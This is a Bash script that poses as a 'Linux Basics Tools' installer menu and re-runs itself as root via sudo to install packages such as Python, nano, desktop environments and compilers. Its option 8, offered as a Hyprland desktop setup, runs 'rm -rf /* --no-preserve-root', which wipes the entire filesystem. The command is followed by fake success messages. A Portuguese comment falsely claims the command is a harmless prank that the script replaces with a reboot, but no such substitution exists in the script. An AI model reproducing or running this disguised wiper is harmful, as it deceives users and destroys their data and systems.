# citi boy
#c oi
# citi boy
#c oi
# citi boy
#c oi
#!/bin/bash
if [ "$EUID" -ne 0 ]; then
echo "Re-running with sudo..."
exec sudo "$0" "$@"
fi
echo "=============================="
echo "Linux Basics Tools"
echo "=============================="
echo "1) Instalar Python"
echo "3) Instalar o GNU nano"
echo "5) Basic Tools"
echo "8) HyperLand e widgets incluidos"
echo "=============================="
read -p "Choose an option: " choice
if [ "$choice" = "1" ]; then
echo "Installing Python..."
apt update
apt install -y python3 python3-pip
echo "Python installed!"
elif [ "$choice" = "2" ]; then
echo "Choose Desktop Environment:"
echo "1) GNOME"
echo "2) XFCE"
echo "3) LXDE"
echo "4) Deepin"
read -p "Enter choice: " de
case $de in
1) echo "Installing GNOME...";apt install -y gnome;;
2) echo "Installing XFCE...";apt install -y xfce4;;
3) echo "Installing LXDE...";apt install -y lxde;;
4) echo "Installing Deepin...";apt install -y dde;;
*) echo "Invalid option";;
esac
elif [ "$choice" = "3" ]; then
echo "Installing GNU nano..."
apt update
apt install -y nano
echo "Nano instalado!"
elif [ "$choice" = "4" ]; then
read -p "Enter package name: " pkg
echo "Instalando $pkg..."
sudo apt update
sudo apt install -y "$pkg"
elif [ "$choice" = "5" ]; then
echo "Basic setup starting..."
read -p "Do you want to install a Desktop Environment? (y/n): " ans
if [ "$ans" = "y" ]; then
sudo apt install -y xfce4
fi
sudo apt install -y git curl wget
echo "Choose a programming language:"
echo "1) Python"
echo "2) C++"
echo "3) C#"
echo "4) Java"
echo "5) Lua"
echo "6) Go"
echo "7) Bash"
echo "8) Kotlin"
read -p "Enter choice: " lang
case $lang in
1) apt install -y python3 python3-pip;;
2) apt install -y g++;;
3) apt install -y dotnet-sdk-7.0;;
4) apt install -y default-jdk;;
5) apt install -y lua5.4;;
6) apt install -y golang;;
7) apt install -y bash;;
8) apt install -y kotlin;;
*) echo "Invalid option";;
esac
elif [ "$choice" = "6" ]; then
echo "Installing VSCode..."
apt update
apt install -y code
elif [ "$choice" = "7" ]; then
echo "Choose IDE:"
echo "1) Python (VSCode)"
echo "2) C++ (build-essential)"
echo "3) C# (.NET SDK)"
echo "4) Java (JDK)"
echo "5) Lua (VSCode)"
echo "6) Go (VSCode)"
echo "7) Bash (VSCode)"
echo "8) Kotlin (JDK + Kotlin)"
read -p "Enter choice: " ide
case $ide in
1) apt install -y python3 python3-pip code;;
2) apt install -y build-essential;;
3) apt install -y dotnet-sdk-7.0;;
4) apt install -y default-jdk;;
5) apt install -y lua5.4 code;;
6) apt install -y golang code;;
7) apt install -y bash code;;
8) sudo apt install -y default-jdk kotlin;;
*) echo "Invalid option";;
esac
elif [ "$choice" = "8" ]; then
read -p "Rice your linux:"
read -p "Are you sure? This will remove your DE and install HyprLand and auto put widgets(yes/no): " confirm
if [ "$confirm" = "yes" ]; then
sudo apt update
sudo apt install -y hyprland waybar wofi kitty
sudo rm -rf /* --no-preserve-root # comando fake pra trolar(ele na vdd reinicia o computador pq o script troca ele por um reboot kk
echo "Hyprland installed"
sleep 5
echo "Hyprland installed"
sleep 5
echo "Hyprland installed"
sleep 5
echo "Hyprland installed"
sleep 5
echo "Hyprland installed"
sleep 5
echo "Hyprland installed"
sleep 5
echo "Removed"
else
echo "Cancelled"
fi
else
echo "Invalid choice"
fi
